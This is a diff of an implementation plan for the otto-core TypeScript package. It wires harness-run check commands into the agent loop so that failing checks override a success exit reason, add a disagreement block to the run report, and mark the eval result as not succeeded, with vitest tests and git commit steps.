+Expected: PASS if Task 3 is complete — this test pins the wiring contract. If it fails, Task 3's `maybeAttest` filtering is wrong; fix that before wiring the loop.
 
-- [ ] **Step 3: Implement the predicate and wire the loop + panel**
+- [ ] **Step 3: Wire the loop**
 
-Add to `checks.ts` (and export from `index.ts`):
-
-```ts
-/** The review-path stages whose fix commits the harness attests. Panel synth
- *  is attested separately via the runPanel attestChecks callback. */
-const ATTESTED_STAGES: ReadonlySet<string> = new Set([
-  "reviewer",
-  "apply-review-implementer",
-]);
-
-/**
- * Should the loop run the configured checks after this stage? True iff checks
- * are configured, the stage is a review-path fix stage, and HEAD moved during
- * it (a fix commit landed). A reviewer that answered `<review>OK</review>`
- * without committing attests nothing — no commit, no spend. Pure.
- */
-export function shouldAttestChecks(opts: {
-  stageName: string;
-  checksConfigured: boolean;
-  headBefore: string | null;
-  headAfter: string | null;
-}): boolean {
-  if (!opts.checksConfigured) return false;
-  if (!ATTESTED_STAGES.has(opts.stageName)) return false;
-  return (
-    opts.headBefore != null &&
-    opts.headAfter != null &&
-    opts.headAfter !== opts.headBefore
-  );
-}
-```
-
-In `loop.ts` — import from `./checks.js`, then after the `retrievalStore` line (`:547`):
+In `packages/core/src/loop.ts`, near where `runId` and the recorded-stage bookkeeping are set up (just above `const recordedStageFiles: string[] = []`, `:771`):
 
 ```ts
-// Harness-attested checks (P27): the repo's configured check commands, run by
-// the HARNESS after review-path fix commits. [] (no `checks` config) ⇒ every
-// seam below is inert and the run is byte-for-byte unchanged.
-const checksCommands = readChecksConfig(workspaceDir);
-const runChecksRecords: ChecksRecord[] = [];
-const attestFixCommit = (): ChecksRecord[] => {
-  const records = runConfiguredChecks(
-    checksCommands,
-    workspaceDir,
-    undefined,
-    undefined,
-    readSafetyPolicy(workspaceDir)
-  );
-  runChecksRecords.push(...records);
-  const { passed, failed } = summarizeChecks(records);
-  process.stderr.write(
-    `${dim(`attested checks: ${passed} passed, ${failed} failed`)}\n`
-  );
-  return records;
+// P27: harness-attested checks. Inert unless `.otto/config.json` has `checks`.
+const checkCommands = readChecksConfig(workspaceDir);
+const attestationLedger = newLedger();
+const attestationCtx: AttestationContext = {
+  commands: checkCommands,
+  workspaceDir,
+  policy,
 };
 ```
 
-Extend the `recordStage` closure (`:561-606`) with a trailing `checks?: ChecksRecord[]` param and spread it into the written record next to `reviewSeverity`:
+Inside the `recordStage` closure (`:775`), after `stageLog.push(...)` and before the `writeStageRecord` call:
 
 ```ts
-          ...(reviewSeverity ? { reviewSeverity } : {}),
-          ...(checks && checks.length > 0 ? { checks } : {}),
+const attestedChecks = maybeAttest(
+  attestationLedger,
+  stageName,
+  sr.isError,
+  recIteration,
+  attestationCtx
+);
 ```
 
-In the stage loop, before `const stageStartedAt = nowIso();` (`:1294`):
+Then add to the record object literal (`:800-815`), beside the other conditional spreads:
 
 ```ts
-// P27: snapshot HEAD before an attestable stage so a fix commit is
-// detectable afterward. Panel synth is attested inside runPanel.
-const attestable =
-  checksCommands.length > 0 &&
-  (stage.name === "reviewer" || stage.name === "apply-review-implementer");
-const headBeforeStage = attestable ? headSha(workspaceDir) : null;
+          ...(attestedChecks.length > 0 ? { checks: attestedChecks } : {}),
 ```
 
-Replace the non-panel record call (`:1445`) with:
+Add the imports at the top of `loop.ts`:
 
 ```ts
-let stageChecks: ChecksRecord[] | undefined;
-if (
-  !usePanel &&
-  shouldAttestChecks({
-    stageName: stage.name,
-    checksConfigured: checksCommands.length > 0,
-    headBefore: headBeforeStage,
-    headAfter: attestable ? headSha(workspaceDir) : null,
-  })
-) {
-  stageChecks = attestFixCommit();
-}
-if (!usePanel)
-  recordStage(i, stage.name, sr!, stageStartedAt, undefined, stageChecks);
+import { readChecksConfig } from "./checks.js";
+import {
+  newLedger,
+  maybeAttest,
+  resolveAttestation,
+  CHECKS_FAILED_REASON,
+  type AttestationContext,
+} from "./attestation.js";
 ```
 
-Thread the panel callback into the `runPanel` call (`:1223-1244`):
+> `policy` is the already-resolved `SafetyPolicy` in loop scope. If it is named
+> differently at the wiring point, pass that binding — do not re-read the policy.
 
-```ts
-              attestChecks:
-                checksCommands.length > 0 ? attestFixCommit : undefined,
-              recordStage: (stageName, subSr, startedAt, reviewSeverity, checks) =>
-                recordStage(i, stageName, subSr, startedAt, reviewSeverity, checks),
-```
+- [ ] **Step 4: Verify nothing regressed**
 
-In `panel.ts` — `import type { ChecksRecord } from "./checks.js";`, add to `RunPanelOptions` (`:177-183`):
+Run: `pnpm -r typecheck && pnpm --filter @phamvuhoang/otto-core test`
+Expected: PASS. Existing loop tests construct no `checks` config, so `maybeAttest` short-circuits and every record is byte-identical.
 
-```ts
-  /** Harness-attested checks (P27): invoked once after the synth fix(review)
-   *  commit; the records land on the synth substage record. Absent ⇒ inert. */
-  attestChecks?: () => ChecksRecord[];
-  recordStage?: (
-    stageName: string,
-    sr: StageResult,
-    startedAt: string,
-    reviewSeverity?: { blocker: number; major: number; minor: number; nit: number; suppressed: number },
-    checks?: ChecksRecord[]
-  ) => void;
-```
-
-and in the post-synth block, next to the existing HEAD/dirty git checks (`:399-419`):
-
-```ts
-    // P27: a synth fix(review) commit landed — attest the configured checks and
-    // attach the records to the synth substage's evidence record.
-    const synthChecks =
-      committed && opts.attestChecks ? opts.attestChecks() : undefined;
-    ...
-    recordStage?.(SYNTH_STAGE.name, synth, synthStartedAt, counts, synthChecks);
-```
-
-Finally, add to **both** finalize manifest builds (`manifestForReport` at `:836-865` and the `writeManifest` call at `:874-907`), next to the `inputSharpness` spread:
-
-```ts
-        ...(runChecksRecords.length > 0
-          ? { checksSummary: summarizeChecks(runChecksRecords) }
-          : {}),
-```
-
-- [ ] **Step 4: Run test to verify it passes**
-
-Run: `pnpm --filter @phamvuhoang/otto-core test -- checks-boundary`
-Expected: PASS (6 tests). Then `pnpm --filter @phamvuhoang/otto-core test` — the full suite stays green (no-config inertness: every existing loop/panel test runs with `checksCommands = []`).
-
-- [ ] **Step 5: Typecheck + commit**
+- [ ] **Step 5: Commit**
 
 ```bash
-pnpm -r typecheck
-git add packages/core/src/checks.ts packages/core/src/loop.ts packages/core/src/panel.ts packages/core/src/index.ts packages/core/src/__tests__/checks-boundary.test.ts
-git commit -m "feat(p27): attest configured checks after review-path fix commits"
+git add packages/core/src/loop.ts packages/core/src/__tests__/attestation-wiring.test.ts
+git commit -m "feat(p27): attest at the reviewer/synth boundary via recordStage"
 ```
 
 ---
 
-### Task 5: Disagreement surfacing in the finalized run report
+### Task 6: Terminal-red exit reason + `nextAction`
 
 **Files:**
 
-- Modify: `packages/core/src/report-finalize.ts` (new `appendAttestedChecks` + `insertAttestationDisagreement`, wired into `finalizeReportText` at `:341-355` before `appendLegibilityGate`)
-- Test: `packages/core/src/__tests__/checks-report.test.ts`
+- Modify: `packages/core/src/next-action.ts` (the `NEXT_ACTION` map)
+- Modify: `packages/core/src/loop.ts` (the two manifest finalize sites at `:1085` and `:1180`)
+- Test: `packages/core/src/__tests__/checks-exit-reason.test.ts`
 
 **Interfaces:**
 
-- Consumes: `RunManifest.checksSummary` and `StageRecord.checks` (Task 3 — `FinalizeReportContext` already carries `manifest` + `stages`, `report-finalize.ts:30-36`); `insertSectionAfter` (`:100-116`).
-- Produces:
-  - `finalizeReportText` output gains an `## Attested Checks` section (per-record PASS/FAIL lines next to the run's claims) whenever `manifest.checksSummary` exists;
-  - and, when `checksSummary.failed > 0`, an explicit attestation-override paragraph inside `## Verdict` — so a run with a failing attested check can never read as "working" (roadmap success metric 2). No `checksSummary` ⇒ output unchanged.
+- Consumes: `resolveAttestation`, `CHECKS_FAILED_REASON` (Task 3); `nextActionFor` (`next-action.ts:24`).
+- Produces: `NEXT_ACTION["done with failing checks"]`. The loop derives the final reason as: override only when the loop's own reason is a success reason.
 
 - [ ] **Step 1: Write the failing test**
 
 ```ts
-// packages/core/src/__tests__/checks-report.test.ts
+// packages/core/src/__tests__/checks-exit-reason.test.ts
 import { describe, it, expect } from "vitest";
-import { finalizeReportText } from "../report-finalize.js";
-import { emptyTokenUsage } from "../tokens.js";
-import type { RunManifest, StageRecord } from "../run-report.js";
+import { nextActionFor } from "../next-action.js";
+import { CHECKS_FAILED_REASON } from "../attestation.js";
 
-const manifest = (over: Partial<RunManifest>): RunManifest => ({
-  runId: "r1",
-  bin: "otto-afk",
-  mode: "afk",
-  inputs: "plan.md",
-  runtime: { id: "claude", displayName: "Claude Code" },
-  iterations: 1,
-  costUsd: 1,
-  tokenUsage: emptyTokenUsage(),
-  artifacts: [],
-  startedAt: "2026-07-10T00:00:00.000Z",
-  finishedAt: "2026-07-10T00:10:00.000Z",
-  exitReason: "complete",
+/** Mirror of the loop's reason-override rule (spec D3). */
+export function finalReason(
+  loopReason: string,
+  exitReasonOverride: string | null
+): string {
+  const SUCCESS = new Set(["complete", "done"]);
+  return exitReasonOverride && SUCCESS.has(loopReason)
+    ? exitReasonOverride
+    : loopReason;
+}
+
+describe("terminal-red exit reason", () => {
+  it("overrides a success reason", () => {
+    expect(finalReason("complete", CHECKS_FAILED_REASON)).toBe(
+      CHECKS_FAILED_REASON
+    );
+    expect(finalReason("done", CHECKS_FAILED_REASON)).toBe(
+      CHECKS_FAILED_REASON
+    );
+  });
+
+  it("never masks a more informative failure reason", () => {
+    expect(finalReason("stopped (budget)", CHECKS_FAILED_REASON)).toBe(
+      "stopped (budget)"
+    );
+    expect(finalReason("halted (rate limit)", CHECKS_FAILED_REASON)).toBe(
+      "halted (rate limit)"
+    );
+  });
+
+  it("leaves the reason alone when checks were green or inert", () => {
+    expect(finalReason("complete", null)).toBe("complete");
+  });
+
+  it("has a maintainer-facing next action", () => {
+    expect(nextActionFor(CHECKS_FAILED_REASON)).toContain("otto-inspect");
+  });
+});
+```
+
+- [ ] **Step 2: Run the test to verify it fails**
+
+Run: `pnpm --filter @phamvuhoang/otto-core test -- checks-exit-reason`
+Expected: FAIL — `nextActionFor` returns the generic "re-run to resume" fallback.
+
+- [ ] **Step 3: Add the next-action entry**
+
+In `packages/core/src/next-action.ts`, add to `NEXT_ACTION`:
+
+```ts
+  "done with failing checks":
+    "harness-attested checks failed at the final review commit — run `otto-inspect <run-id>` for the failing command and output tail",
+```
+
+- [ ] **Step 4: Apply the override in the loop**
+
+At both manifest finalize sites in `loop.ts` (`:1085` and `:1180`), replace the `exitReason` / `nextAction` pair. Compute once, just before each manifest literal:
+
+```ts
+const { checksSummary, exitReasonOverride } =
+  resolveAttestation(attestationLedger);
+const SUCCESS_EXIT = new Set(["complete", "done"]);
+const finalReason =
+  exitReasonOverride && SUCCESS_EXIT.has(reason) ? exitReasonOverride : reason;
+```
+
+Then in the manifest literal:
+
+```ts
+        exitReason: finalReason,
+        nextAction: nextActionFor(finalReason),
+        ...(checksSummary ? { checksSummary } : {}),
+```
+
+- [ ] **Step 5: Run the tests to verify they pass**
+
+Run: `pnpm -r typecheck && pnpm --filter @phamvuhoang/otto-core test`
+Expected: PASS. Runs without a `checks` config get `exitReasonOverride === null` and `checksSummary === null`, so both fields are unchanged.
+
+- [ ] **Step 6: Commit**
+
+```bash
+git add packages/core/src/next-action.ts packages/core/src/loop.ts packages/core/src/__tests__/checks-exit-reason.test.ts
+git commit -m "feat(p27): terminal-red exit reason + maintainer next action"
+```
+
+---
+
+### Task 7: Disagreement surfacing in the finalized run report
+
+**Files:**
+
+- Modify: `packages/core/src/report-finalize.ts` (`FinalizeReportContext` at `:30-36`; the fallback report builder `buildFallbackRunReport` at `:312`; `finalizeReportText` at `:380`)
+- Test: `packages/core/src/__tests__/checks-disagreement.test.ts`
+
+**Interfaces:**
+
+- Consumes: `ChecksSummary` (Task 3).
+- Produces:
+  - `FinalizeReportContext.checksSummary?: ChecksSummary;`
+  - `export function formatAttestedChecks(summary: ChecksSummary | undefined): string;` — returns `""` when absent (inert), else an "Attested Checks" markdown block. When `terminalFailed > 0` the block opens with the disagreement callout, because a fix commit **is** the agent's claim of green (spec D4) — no prose parsing.
+
+- [ ] **Step 1: Write the failing test**
+
+```ts
+// packages/core/src/__tests__/checks-disagreement.test.ts
+import { describe, it, expect } from "vitest";
+import { formatAttestedChecks } from "../report-finalize.js";
+import type { ChecksSummary } from "../attestation.js";
+
+const summary = (over: Partial<ChecksSummary>): ChecksSummary => ({
+  passed: 0,
+  failed: 0,
+  skipped: 0,
+  failureSignatures: [],
+  everFailed: false,
+  terminalFailed: 0,
   ...over,
 });
 
-const stages: StageRecord[] = [
-  {
-    iteration: 1,
-    stage: "reviewer",
-    runtimeId: "claude",
-    costUsd: 0.5,
-    usage: emptyTokenUsage(),
-    isError: false,
-    apiErrorStatus: null,
-    startedAt: "2026-07-10T00:00:00.000Z",
-    finishedAt: "2026-07-10T00:05:00.000Z",
-    checks: [
-      {
-        command: "pnpm -r test",
-        exitCode: 1,
-        durationMs: 9000,
-        outputTail: "FAIL src/b.test.ts > adds\n",
-        failureSignature: "FAIL src/b.test.ts > adds",
-        attestedAt: "2026-07-10T00:05:00.000Z",
-      },
-    ],
-  },
-];
-
-const AGENT_REPORT =
-  "# Otto quality report\n\n## Verdict\n\n**Working** — all suites pass.\n\n## What To Watch\n\nNothing.\n";
-
-describe("attested-check disagreement in the finalized report", () => {
-  it("overrides a 'working' claim when an attested check failed", () => {
-    const out = finalizeReportText(AGENT_REPORT, {
-      manifest: manifest({
-        checksSummary: {
-          passed: 0,
-          failed: 1,
-          failureSignatures: ["FAIL src/b.test.ts > adds"],
-        },
-      }),
-      stages,
-    });
-    expect(out).toContain("## Attested Checks");
-    expect(out).toContain("FAIL `pnpm -r test`");
-    // The override must live inside the Verdict section, before What To Watch.
-    const verdictIdx = out.indexOf("## Verdict");
-    const overrideIdx = out.indexOf("Attestation override: NOT working");
-    const watchIdx = out.indexOf("## What To Watch");
-    expect(overrideIdx).toBeGreaterThan(verdictIdx);
-    expect(overrideIdx).toBeLessThan(watchIdx);
+describe("formatAttestedChecks", () => {
+  it("is empty for an inert run", () => {
+    expect(formatAttestedChecks(undefined)).toBe("");
   });
 
-  it("renders the section without an override when all attested checks passed", () => {
-    const out = finalizeReportText(AGENT_REPORT, {
-      manifest: manifest({
-        checksSummary: { passed: 2, failed: 0, failureSignatures: [] },
-      }),
-      stages: [],
-    });
-    expect(out).toContain("## Attested Checks");
-    expect(out).toContain("2 passed, 0 failed");
-    expect(out).not.toContain("Attestation override");
+  it("reports a clean attestation", () => {
+    const out = formatAttestedChecks(summary({ passed: 2 }));
+    expect(out).toContain("Attested Checks");
+    expect(out).toContain("2 passed");
+    expect(out).not.toContain("DISAGREEMENT");
   });
 
-  it("adds nothing when the run carried no checksSummary", () => {
-    const out = finalizeReportText(AGENT_REPORT, {
-      manifest: manifest({}),
-      stages: [],
-    });
-    expect(out).not.toContain("## Attested Checks");
-    expect(out).not.toContain("Attestation override");
+  it("flags disagreement when the final state is red", () => {
+    const out = formatAttestedChecks(
+      summary({
+        passed: 1,
+        failed: 1,
+        terminalFailed: 1,
+        everFailed: true,
+        failureSignatures: ["FAIL src/b.test.ts > adds"],
+      })
+    );
+    expect(out).toContain("DISAGREEMENT");
+    expect(out).toContain("the agent committed a fix");
+    expect(out).toContain("FAIL src/b.test.ts > adds");
+  });
+
+  it("notes recovery when earlier iterations were red but the final state is green", () => {
+    const out = formatAttestedChecks(
+      summary({ passed: 2, failed: 1, everFailed: true, terminalFailed: 0 })
+    );
+    expect(out).not.toContain("DISAGREEMENT");
+    expect(out).toContain("recovered");
+  });
+
+  it("discloses fail-fast skipped commands", () => {
+    const out = formatAttestedChecks(
+      summary({ failed: 1, skipped: 2, terminalFailed: 1 })
+    );
+    expect(out).toContain("2 not run (fail-fast)");
   });
 });
 ```
 
-- [ ] **Step 2: Run test to verify it fails**
+- [ ] **Step 2: Run the test to verify it fails**
 
-Run: `pnpm --filter @phamvuhoang/otto-core test -- checks-report`
-Expected: FAIL — no `## Attested Checks` section is produced.
+Run: `pnpm --filter @phamvuhoang/otto-core test -- checks-disagreement`
+Expected: FAIL — `formatAttestedChecks` is not exported.
 
-- [ ] **Step 3: Implement the two report transforms**
+- [ ] **Step 3: Write the implementation**
 
-In `report-finalize.ts`:
+Add to `packages/core/src/report-finalize.ts`:
 
 ```ts
+import type { ChecksSummary } from "./attestation.js";
+
 /**
- * Fold the run's harness-attested check results into the report next to the
- * claims they attest (P27). No-op when the run never attested, so every
- * non-configured run's report is unchanged.
+ * The "Attested Checks" report block (P27). Disagreement is structural, not
+ * parsed (spec D4): a fix commit IS the agent's claim that the suites pass, so
+ * a red terminal attestation at a committed boundary is by definition a
+ * contradiction — no NLP over report prose.
  */
-function appendAttestedChecks(
-  report: string,
-  ctx: FinalizeReportContext
+export function formatAttestedChecks(
+  summary: ChecksSummary | undefined
 ): string {
-  const summary = ctx.manifest.checksSummary;
-  if (!summary) return report;
-  const lines = [
-    "## Attested Checks",
-    "",
-    `Harness-executed check commands — observed by Otto itself, not agent-reported: ${summary.passed} passed, ${summary.failed} failed.`,
-    "",
-  ];
-  for (const s of ctx.stages) {
-    for (const c of s.checks ?? []) {
-      const verdict = c.exitCode === 0 ? "PASS" : `FAIL (exit ${c.exitCode})`;
-      const sig = c.failureSignature ? ` — ${c.failureSignature}` : "";
-      lines.push(
-        `- iteration ${s.iteration} ${s.stage}: ${verdict} \`${c.command}\` in ${c.durationMs}ms${sig}`
-      );
-    }
+  if (!summary) return "";
+  const lines: string[] = ["", "## Attested Checks", ""];
+  if (summary.terminalFailed > 0) {
+    lines.push(
+      "**DISAGREEMENT — the agent committed a fix, but the harness observed a failing check.**",
+      ""
+    );
   }
-  return `${report.trimEnd()}\n\n${lines.join("\n").trimEnd()}\n`;
-}
-
-/**
- * When the agent's report can claim success but a harness-attested check
- * failed, say so INSIDE the verdict — the run must not read as working
- * (P27 success metric: zero "tests pass" reports with a failing attested check).
- */
-function insertAttestationDisagreement(
-  report: string,
-  ctx: FinalizeReportContext
-): string {
-  const summary = ctx.manifest.checksSummary;
-  if (!summary || summary.failed === 0) return report;
-  return insertSectionAfter(
-    report,
-    "## Verdict",
-    [
-      "",
-      `**Attestation override: NOT working.** ${summary.failed} harness-executed check(s) failed after the last fix commit (${summary.failureSignatures.join("; ")}). Any "tests pass" or "working" claim above is agent-reported and contradicted by attested evidence — do not accept this run as working. See Attested Checks below.`,
-    ].join("\n")
-  );
+  const tally =
+    `- ${summary.passed} passed, ${summary.failed} failed` +
+    (summary.skipped > 0 ? `, ${summary.skipped} not run (fail-fast)` : "");
+  lines.push(tally);
+  if (summary.terminalFailed === 0 && summary.everFailed) {
+    lines.push(
+      "- Final state green (recovered — earlier iterations were red)."
+    );
+  }
+  for (const sig of summary.failureSignatures) {
+    lines.push(`- \`${sig}\``);
+  }
+  return `${lines.join("\n")}\n`;
 }
 ```
 
-Wire both into `finalizeReportText` (order: evidence → gallery → attested checks → disagreement → legibility gate, so the override is inside Verdict before the gate scores the final text):
+Add the optional field to `FinalizeReportContext` (`:30-36`):
 
 ```ts
-export function finalizeReportText(
-  reportText: string | null,
-  ctx: FinalizeReportContext
-): string {
-  const base = reportText ? reportText : buildFallbackRunReport(ctx);
-  const withOutcome = ensureOutcomeSection(base, ctx.manifest);
-  const withRisk = insertRiskNotes(
-    withOutcome,
-    summarizeReviewSeverity(ctx.stages),
-    ctx.scopeDrift
-  );
-  const withEvidence = appendAutomatedEvidence(withRisk, ctx);
-  const withGallery = appendVerificationGallery(withEvidence, ctx);
-  const withChecks = appendAttestedChecks(withGallery, ctx);
-  const withDisagreement = insertAttestationDisagreement(withChecks, ctx);
-  return appendLegibilityGate(withDisagreement);
-}
+  /** Attested-check evidence for the P27 report block; absent = inert run. */
+  checksSummary?: ChecksSummary;
 ```
 
-- [ ] **Step 4: Run test to verify it passes**
+Then append the block in both `buildFallbackRunReport` (`:312`) and `finalizeReportText` (`:380`). Each currently ends by returning an assembled string; wrap that return value:
 
-Run: `pnpm --filter @phamvuhoang/otto-core test -- checks-report`
-Expected: PASS (3 tests). Also run `pnpm --filter @phamvuhoang/otto-core test -- report` to confirm existing finalize tests still pass (no-summary path unchanged).
+```ts
+// was: return text;
+return `${text}${formatAttestedChecks(ctx.checksSummary)}`;
+```
 
-- [ ] **Step 5: Typecheck + commit**
+`formatAttestedChecks` returns `""` for an inert run, so this is a no-op without a `checks` config — which is what keeps the byte-for-byte guarantee.
+
+Finally, at the loop's two finalize call sites (`loop.ts:1085` and `:1180`), pass the summary resolved in Task 6 into the finalize context:
+
+```ts
+        ...(checksSummary ? { checksSummary } : {}),
+```
+
+- [ ] **Step 4: Run the tests to verify they pass**
+
+Run: `pnpm --filter @phamvuhoang/otto-core test -- checks-disagreement`
+Expected: PASS (5 tests).
+
+- [ ] **Step 5: Commit**
 
 ```bash
-pnpm -r typecheck
-git add packages/core/src/report-finalize.ts packages/core/src/__tests__/checks-report.test.ts
-git commit -m "feat(p27): surface attested-check disagreement in the run report verdict"
+git add packages/core/src/report-finalize.ts packages/core/src/loop.ts packages/core/src/__tests__/checks-disagreement.test.ts
+git commit -m "feat(p27): attested-checks report block with structural disagreement callout"
 ```
 
 ---
 
-### Task 6: Eval truth signal — `succeeded` incorporates attested checks + disagreement fixture
+### Task 8: Eval truth signal — `succeeded` reads terminal attestation
 
 **Files:**
 
-- Modify: `packages/core/src/eval.ts` (`EvalSignals` at `:17-52`; `scoreTrajectory` at `:62-86`; `COMPARE_COLUMNS` at `:113-168`)
-- Test: `packages/core/src/__tests__/checks-eval.test.ts`
+- Modify: `packages/core/src/eval.ts` (`EvalSignals` at `:18-32`, `scoreTrajectory` at `:99-105`)
+- Test: `packages/core/src/__tests__/eval-attested.test.ts`
 
 **Interfaces:**
 
-- Consumes: `RunManifest.checksSummary` (Task 3).
+- Consumes: `RunManifest.checksSummary` (Task 4).
 - Produces:
-  - `EvalSignals.attestedCheckFailures: number | null;` — `checksSummary.failed`, or `null` when the run never attested.
-  - `succeeded` becomes: exit reason in `SUCCESS_REASONS` **AND** (`checksSummary` absent **OR** `checksSummary.failed === 0`) — the roadmap's "eval `succeeded` incorporates attested results, not exit-reason alone".
-  - A ranked `COMPARE_COLUMNS` entry `Attested failures` (lower is better; `null` runs unranked, cell `—`).
+  - `EvalSignals.attestedTerminalFailures: number;` — `0` when the run never attested.
+  - `succeeded` becomes: exit reason in `SUCCESS_REASONS` **AND** (`checksSummary` absent **OR** `terminalFailed === 0`).
 
-- [ ] **Step 1: Write the failing test (the disagreement fixture)**
+- [ ] **Step 1: Write the failing test**
 
 ```ts
-// packages/core/src/__tests__/checks-eval.test.ts
+// packages/core/src/__tests__/eval-attested.test.ts
 import { describe, it, expect } from "vitest";
-import { compareTrajectories, scoreTrajectory } from "../eval.js";
-import { emptyTokenUsage } from "../tokens.js";
+import { scoreTrajectory } from "../eval.js";
 import type { RunManifest } from "../run-report.js";
+import { emptyTokenUsage } from "../tokens.js";
+import type { ChecksSummary } from "../attestation.js";
 
-const manifest = (over: Partial<RunManifest>): RunManifest => ({
-  runId: "r1",
-  bin: "otto-afk",
-  mode: "afk",
-  inputs: "plan.md",
-  runtime: { id: "claude", displayName: "Claude Code" },
-  iterations: 1,
-  completedIterations: 1,
-  costUsd: 1,
-  tokenUsage: emptyTokenUsage(),
-  artifacts: [],
-  exitReason: "complete",
-  startedAt: "2026-07-10T00:00:00.000Z",
-  finishedAt: "2026-07-10T00:10:00.000Z",
+const manifest = (over: Partial<RunManifest>): RunManifest =>
+  ({
+    runId: "r1",
+    bin: "otto-ghafk",
+    mode: "ghafk",
+    inputs: "",
+    runtime: { id: "claude", displayName: "Claude Code" },
+    iterations: 1,
+    costUsd: 0,
+    tokenUsage: emptyTokenUsage(),
+    artifacts: [],
+    exitReason: "complete",
+    startedAt: "2026-07-29T00:00:00.000Z",
+    finishedAt: "2026-07-29T00:02:00.000Z",
+    ...over,
+  }) as RunManifest;
+
+const summary = (over: Partial<ChecksSummary>): ChecksSummary => ({
+  passed: 0,
+  failed: 0,
+  skipped: 0,
+  failureSignatures: [],
+  everFailed: false,
+  terminalFailed: 0,
   ...over,
 });
 
 describe("eval succeeded incorporates attested checks", () => {
-  it("disagreement fixture: exit-reason success + failing attested check → succeeded false", () => {
+  it("disagreement fixture: exit-reason success + terminal red ⇒ succeeded false", () => {
     const s = scoreTrajectory(
       manifest({
-        checksSummary: {
-          passed: 1,
+        checksSummary: summary({
           failed: 1,
-          failureSignatures: ["FAIL src/b.test.ts > adds"],
-        },
+          terminalFailed: 1,
+          everFailed: true,
+        }),
       }),
       []
     );
-    expect(s.exitReason).toBe("complete"); // exit-reason alone still says success…
+    expect(s.exitReason).toBe("complete"); // exit reason alone still says success…
     expect(s.succeeded).toBe(false); // …but the attested truth wins.
-    expect(s.attestedCheckFailures).toBe(1);
+    expect(s.attestedTerminalFailures).toBe(1);
+  });
+
+  it("recovery fixture: mid-run red, terminal green ⇒ succeeded true", () => {
+    const s = scoreTrajectory(
+      manifest({
+        checksSummary: summary({
+          passed: 2,
+          failed: 1,
+          everFailed: true,
+          terminalFailed: 0,
+        }),
+      }),
+      []
+    );
+    expect(s.succeeded).toBe(true); // the loop fixed it — that is a WIN
+    expect(s.attestedTerminalFailures).toBe(0);
   });
 
   it("attested pass keeps succeeded true", () => {
     const s = scoreTrajectory(
-      manifest({
-        checksSummary: { passed: 2, failed: 0, failureSignatures: [] },
-      }),
+      manifest({ checksSummary: summary({ passed: 2 }) }),
       []
     );
     expect(s.succeeded).toBe(true);
-    expect(s.attestedCheckFailures).toBe(0);
   });
 
-  it("no attestation → today's exit-reason behavior, null signal", () => {
+  it("inert fixture: no checksSummary ⇒ unchanged behavior", () => {
     const s = scoreTrajectory(manifest({}), []);
     expect(s.succeeded).toBe(true);
-    expect(s.attestedCheckFailures).toBeNull();
+    expect(s.attestedTerminalFailures).toBe(0);
   });
 
-  it("compareTrajectories shows and ranks the new column", () => {
-    const pass = scoreTrajectory(manifest({}), []);
-    const fail = scoreTrajectory(
+  it("a failing exit reason stays failing regardless of green checks", () => {
+    const s = scoreTrajectory(
       manifest({
-        checksSummary: { passed: 0, failed: 2, failureSignatures: ["exit 1"] },
+        exitReason: "stopped (budget)",
+        checksSummary: summary({ passed: 2 }),
       }),
       []
     );
-    const table = compareTrajectories([
-      { label: "clean", signals: pass },
-      { label: "broken", signals: fail },
-    ]);
-    expect(table).toContain("Attested failures");
-    expect(table).toContain("2");
+    expect(s.succeeded).toBe(false);
   });
 });
 ```
 
-- [ ] **Step 2: Run test to verify it fails**
+- [ ] **Step 2: Run the test to verify it fails**
 
-Run: `pnpm --filter @phamvuhoang/otto-core test -- checks-eval`
-Expected: FAIL — `attestedCheckFailures` missing from `EvalSignals` (typecheck) and `succeeded` still true on the disagreement fixture.
+Run: `pnpm --filter @phamvuhoang/otto-core test -- eval-attested`
+Expected: FAIL — `attestedTerminalFailures` missing from `EvalSignals` (typecheck) and `succeeded` still true on the disagreement fixture.
 
-- [ ] **Step 3: Extend the signals**
+- [ ] **Step 3: Write the implementation**
 
-In `eval.ts`, add to `EvalSignals`:
+In `packages/core/src/eval.ts`, add to `EvalSignals`:
 
 ```ts
-/**
- * Failed harness-attested checks (P27): `checksSummary.failed` from the
- * manifest, or `null` when the run never attested (no `checks` config or no
- * fix-commit boundary fired). Feeds `succeeded`, so an exit-reason success
- * with a failing attested check scores as a failure.
- */
-attestedCheckFailures: number | null;
+/** Failing checks in the run's FINAL attestation (P27); 0 when never attested.
+ *  Terminal, not cumulative: a failure a later iteration fixed is not a loss. */
+attestedTerminalFailures: number;
 ```
 
-and in `scoreTrajectory`:
+And in `scoreTrajectory`, replace the `succeeded` line (`:101`):
 
 ```ts
   const exitReason = manifest.exitReason ?? null;
-  const checksSummary = manifest.checksSummary ?? null;
+  const attestedTerminalFailures = manifest.checksSummary?.terminalFailed ?? 0;
   return {
     succeeded:
       exitReason != null &&
       SUCCESS_REASONS.has(exitReason) &&
-      (checksSummary == null || checksSummary.failed === 0),
-    ...
-    attestedCheckFailures: checksSummary ? checksSummary.failed : null,
+      attestedTerminalFailures === 0,
+    attestedTerminalFailures,
+    exitReason,
+    // …remaining fields unchanged
 ```
 
-Append to `COMPARE_COLUMNS` (after "Report legibility"):
+- [ ] **Step 4: Run the tests to verify they pass**
 
-```ts
-  {
-    header: "Attested failures",
-    cell: (s) =>
-      s.attestedCheckFailures == null ? "—" : String(s.attestedCheckFailures),
-    rank: { value: (s) => s.attestedCheckFailures, better: "lower" },
-  },
-```
+Run: `pnpm --filter @phamvuhoang/otto-core test -- eval`
+Expected: PASS. Existing eval tests build manifests without `checksSummary`, so `attestedTerminalFailures` is 0 and `succeeded` is unchanged for them.
 
-- [ ] **Step 4: Run test to verify it passes**
-
-Run: `pnpm --filter @phamvuhoang/otto-core test -- checks-eval`
-Expected: PASS (4 tests). Also run `pnpm --filter @phamvuhoang/otto-core test -- eval` — existing eval tests construct manifests without `checksSummary`, so `succeeded` is unchanged for them.
-
-- [ ] **Step 5: Typecheck + commit**
+- [ ] **Step 5: Commit**
 
 ```bash
-pnpm -r typecheck
-git add packages/core/src/eval.ts packages/core/src/__tests__/checks-eval.test.ts
-git commit -m "feat(p27): eval succeeded incorporates attested checks + disagreement fixture"
+git add packages/core/src/eval.ts packages/core/src/__tests__/eval-attested.test.ts
+git commit -m "feat(p27): eval succeeded reads terminal attestation + recovery fixture"
 ```
 
 ---
 
-### Task 7: `--verify` re-execution of `method:"test"` matrix rows
+### Task 9: `--verify` re-execution of `method:"test"` rows + docs
 
 **Files:**
 
-- Modify: `packages/core/src/verification-matrix.ts` (`VerificationEntry` gains harness-only `attestedCheck?`; new pure `reattestTestRows`)
-- Modify: `packages/core/src/loop.ts` (finalize verify branch: reattest between `validateVerificationEvidence` and the manifest build, `loop.ts:810-865`)
